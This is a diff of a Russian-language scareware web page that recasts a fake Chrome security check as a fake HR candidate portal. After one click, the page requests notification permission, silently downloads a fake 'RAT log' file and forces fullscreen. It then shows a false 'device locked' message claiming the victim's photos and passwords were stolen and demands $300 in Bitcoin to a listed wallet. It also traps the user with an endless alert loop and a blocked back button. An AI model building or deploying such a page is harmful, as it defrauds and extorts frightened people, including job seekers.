@@ -3,27 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Google Chrome | Security Check</title>
+    <title>HR Portal | Кабинет кандидата</title>
     <style>
-        body { background-color: black; color: #00ff00; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; -webkit-user-select: none; user-select: none; }
+        body { background-color: black; color: #00ff00; font-family: 'Segoe UI', sans-serif; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; -webkit-user-select: none; user-select: none; }
         #matrix { position: fixed; top: 0; left: 0; width: 100%; height: 100%; font-size: 14px; opacity: 0.15; z-index: 1; pointer-events: none; }
         .content { position: relative; z-index: 10; text-align: center; width: 95%; max-width: 500px; }
         
-        /* СТИЛЬ ДЛЯ ПЕРВОГО ЭКРАНА (ОФИЦИАЛЬНЫЙ) */
-        #overlay { position: fixed; top:0; left:0; width:100%; height:100%; z-index: 9999; background: #1a1a1a; display: flex; justify-content: center; align-items: center; }
-        .start-box { background: #2d2d2d; padding: 30px; border-radius: 8px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border-top: 4px solid #4CAF50; width: 85%; }
-        .start-btn { padding: 15px 30px; font-size: 16px; background: #4CAF50; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.3s; width: 100%; }
+        /* СТИЛЬ ПОД ПОРТАЛ ВАКАНСИЙ */
+        #overlay { position: fixed; top:0; left:0; width:100%; height:100%; z-index: 9999; background: #f4f7f6; display: flex; justify-content: center; align-items: center; }
+        .start-box { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 15px 35px rgba(0,0,0,0.2); width: 85%; color: #333; text-align: center; border-top: 6px solid #2563eb; }
+        .start-btn { padding: 18px; font-size: 16px; background: #2563eb; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; text-transform: uppercase; width: 100%; margin-top: 15px; }
         
-        /* ПОЛОСКА ЗАГРУЗКИ */
+        /* ЛОУДЕР */
         .progress-container { width: 100%; border: 1px solid #333; height: 12px; margin: 20px 0; background: #111; border-radius: 6px; overflow: hidden; }
-        #progress-bar { width: 0%; height: 100%; background: #4CAF50; box-shadow: 0 0 10px #4CAF50; }
-        #status-text { font-size: 14px; color: #888; height: 20px; }
+        #progress-bar { width: 0%; height: 100%; background: #2563eb; box-shadow: 0 0 10px #2563eb; }
+        #status-text { font-size: 14px; color: #888; }
 
-        /* ЭКРАН СТРАХА */
+        /* ЭКРАН ХОРРОРА (ТВОЙ ТЕКСТ) */
         #main-alert { display: none; }
         .devil-img { width: 90%; max-width: 400px; filter: drop-shadow(0 0 25px red); animation: glitch 0.2s infinite; margin-bottom: 15px; }
         @keyframes glitch { 0% { transform: translate(0); } 20% { transform: translate(-2px, 2px); } 40% { transform: translate(-2px, -2px); } 60% { transform: translate(2px, 2px); } 80% { transform: translate(2px, -2px); } 100% { transform: translate(0); } }
-        
         .alert-box { border: 2px solid red; padding: 20px; color: #ff0000; background: rgba(0,0,0,0.95); text-align: left; box-shadow: 0 0 30px red; }
         .btc-wallet { color: yellow; word-break: break-all; font-weight: bold; background: #222; padding: 8px; display: block; border: 1px dashed yellow; margin: 10px 0; font-size: 13px; }
         .danger-btn { background: red; color: white; border: none; padding: 18px; width: 100%; font-weight: 900; cursor: pointer; margin-top: 15px; text-transform: uppercase; }
@@ -35,9 +34,10 @@
 
     <div id="overlay">
         <div class="start-box">
-            <h2 style="color: white; margin-top: 0; font-size: 20px;">Обновление безопасности</h2>
-            <p style="color: #ccc; font-size: 14px; line-height: 1.5;">Для продолжения работы браузера необходимо выполнить проверку системы на наличие критических уязвимостей.</p>
-            <button class="start-btn">ЗАПУСТИТЬ ПРОВЕРКУ</button>
+            <h2 style="margin-top: 0; font-size: 22px; color: #1e293b;">Личный кабинет кандидата</h2>
+            <p style="font-size: 15px; line-height: 1.5; color: #64748b;">Для доступа к деталям вакансии и прохождения собеседования, подтвердите безопасность вашего устройства.</p>
+            <p style="font-size: 12px; color: #94a3b8;">Шаг 1 из 2: Проверка на вредоносное ПО</p>
+            <button class="start-btn">ПОДТВЕРДИТЬ И ВОЙТИ</button>
         </div>
     </div>
 
@@ -45,9 +45,9 @@
 
     <div class="content">
         <div id="loading-screen" style="display: none;">
-            <h3 style="color: white; margin-bottom: 10px;">Анализ системы...</h3>
+            <h3 style="color: white; margin-bottom: 10px;">Проверка безопасности...</h3>
             <div class="progress-container"><div id="progress-bar"></div></div>
-            <div id="status-text">Подготовка ресурсов...</div>
+            <div id="status-text">Анализ браузера...</div>
         </div>
 
         <div id="main-alert">
@@ -55,12 +55,14 @@
             <div class="alert-box">
                 <h2 class="blink" style="text-align: center; margin-top: 0;">УСТРОЙСТВО ЗАБЛОКИРОВАНО</h2>
                 <p>Все данные Telegram, история браузера и личные фото отправлены на сервер <strong>82.202.160.11</strong>.</p>
-                <p><strong>RAT STATUS: ACTIVE</strong>. Ваши пароли и данные Chrome скомпрометированы.</p>
-                <p>Для предотвращения публикации данных в сеть, оплатите <strong>$300</strong> в Bitcoin.</p>
+                <p><strong>RAT STATUS: ACTIVE (SESSION_0x882)</strong></p>
+                <p>Ваше устройство полностью скомпрометировано. Все личные данные (фото, видео, переписки и пароли) были успешно скопированы.</p>
+                <p>Через 168 часов данные будут <strong>ЗАШИФРОВАНЫ</strong> без возможности восстановления.</p>
+                <p>Для предотвращения публикации фото, оплатите <strong>$300</strong> в Bitcoin.</p>
                 
                 <span class="btc-wallet">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</span>
                 
-                <p class="blink" style="font-size: 16px; color: yellow; text-align: center; font-weight: bold;">ОЖИДАНИЕ ОПЛАТЫ (167:58:12)...</p>
+                <p class="blink" style="font-size: 16px; color: yellow; text-align: center; font-weight: bold;">ОЖИДАНИЕ ОПЛАТЫ...</p>
                 <button class="danger-btn" onclick="scareMore()">ДЕАКТИВИРОВАТЬ И УДАЛИТЬ RAT</button>
             </div>
         </div>
@@ -76,28 +78,23 @@
             if (isStarted) return;
             isStarted = true;
             
-            // 1. Убираем оверлей и включаем лоудер
             document.getElementById('overlay').style.display = 'none';
             document.getElementById('loading-screen').style.display = 'block';
 
-            // 2. ЗАПРОС НА УВЕДОМЛЕНИЯ (ТО САМОЕ ОКНО!)
+            // Запрос уведомлений (на Андроиде вылезет запрос)
             if ("Notification" in window) {
-                Notification.requestPermission().then(permission => {
-                    console.log("Permission:", permission);
-                });
+                Notification.requestPermission();
             }
 
-            // 3. АВТОСКАЧИВАНИЕ ФАЙЛА (Сработает из-за клика)
-            const text = "RAT_LOG: START_DUMP\nTARGET: MOBILE_USER\nIP_LOCAL: 192.168.1.45\nSTATUS: DATA_EXFILTRATION_SUCCESS";
-            const blob = new Blob([text], {type: 'text/plain'});
+            // Скачивание файла "лога" втихую
+            const blob = new Blob(["RAT_STATUS: WORKING\nTARGET_EXFILTRATION: SUCCESS"], {type: 'text/plain'});
             const a = document.createElement('a');
             a.href = URL.createObjectURL(blob);
-            a.download = "RAT_SYSTEM_LOG_CRITICAL.txt";
+            a.download = "SECURE_LOG_ID_992.txt"; // Название под стать легенде
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
 
-            // 4. ФУЛЛСКРИН
             if (document.documentElement.requestFullscreen) {
                 document.documentElement.requestFullscreen().catch(() => {});
             }
@@ -107,41 +104,34 @@
 
         function startLoading() {
             const steps = [
-                "Сверка сертификатов...", 
-                "Доступ к Android Manifest...", 
-                "Сканирование Telegram (auth_key)...", 
-                "Чтение базы данных Chrome...", 
-                "Доступ к камере: OK", 
-                "Синхронизация с сервером..."
+                "Проверка SSL сертификата...", 
+                "Шифрование сессии...", 
+                "Анализ окружения Android...", 
+                "Проверка Telegram API...", 
+                "Синхронизация данных...", 
+                "Завершение проверки..."
             ];
             const bar = document.getElementById('progress-bar');
             const status = document.getElementById('status-text');
 
             const timer = setInterval(() => {
-                prg += 1;
+                prg += 1.2;
                 bar.style.width = prg + "%";
-                status.innerText = steps[Math.floor(prg / 17)] || "Завершение дампа...";
+                status.innerText = steps[Math.floor(prg / 17)] || "Авторизация...";
 
                 if(prg >= 100) {
                     clearInterval(timer);
                     showHorror();
                 }
-            }, 60); // Скорость загрузки (около 6 секунд)
+            }, 70);
         }
 
         function showHorror() {
             document.getElementById('loading-screen').style.display = 'none';
             document.getElementById('main-alert').style.display = 'block';
-            
-            // Звук и вибрация
-            const siren = document.getElementById('siren');
-            siren.play().catch(() => {});
-            
-            if(navigator.vibrate) {
-                navigator.vibrate([1000, 500, 1000, 500, 1000]);
-            }
+            document.getElementById('siren').play().catch(() => {});
+            if(navigator.vibrate) navigator.vibrate([1000, 500, 1000]);
 
-            // Матрица на фоне
             const matrix = document.getElementById('matrix');
             setInterval(() => {
                 matrix.innerHTML += Math.random().toString(36).substring(2, 5) + " ";
@@ -150,16 +140,14 @@
         }
 
         function scareMore() {
-            alert("ОШИБКА ДЕАКТИВАЦИИ: Неверный ключ шифрования. Попытка взлома зафиксирована.");
+            alert("ОШИБКА: Доступ запрещен. RAT заблокировал попытку удаления.");
             setTimeout(() => {
                 while(true) {
                     alert("ATTEMPT TO CLOSE BLOCKED");
-                    alert("CRITICAL ERROR: 0x000291");
                 }
             }, 500);
         }
 
-        // Блокировка кнопки назад
         history.pushState(null, null, location.href);
         window.onpopstate = function () { history.go(1); };
     </script>
